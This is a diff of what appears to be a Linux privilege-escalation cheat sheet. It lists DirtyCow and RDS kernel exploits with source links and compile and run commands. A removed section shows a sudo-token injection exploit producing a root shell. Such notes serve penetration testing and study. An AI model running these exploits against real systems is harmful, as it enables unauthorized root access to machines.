@@ -14,10 +14,10 @@ uname -a, netstat -ano, history
 
 1) CVE-2016-5195 (DirtyCow)
 Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
-Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c  
+Code: https://github.com/FireFart/dirtycow/blob/master/dirty.c
 
-  compile:- gcc -pthread dirty.c -o dirty -lcrypt  
-  Time to execute:- "./dirty" or "./dirty my-new-password"
+compile:- gcc -pthread dirty.c -o dirty -lcrypt
+Time to execute:- "./dirty" or "./dirty my-new-password"
 
 2) CVE-2010-3904 (RDS)  
 Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
@@ -104,14 +104,6 @@ $ sudo whatever
 [sudo] password for user:  
 
 # Press <ctrl>+c since you don't have the password.  
-# This creates an invalid sudo tokens.  
-$ sh exploit.sh  
-.... wait 1 seconds  
-$ sudo -i # no password required :)  
-# id  
-uid=0(root) gid=0(root) groups=0(root)  
-	
-Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf  
 
  
 # Writabe /etc/passwd
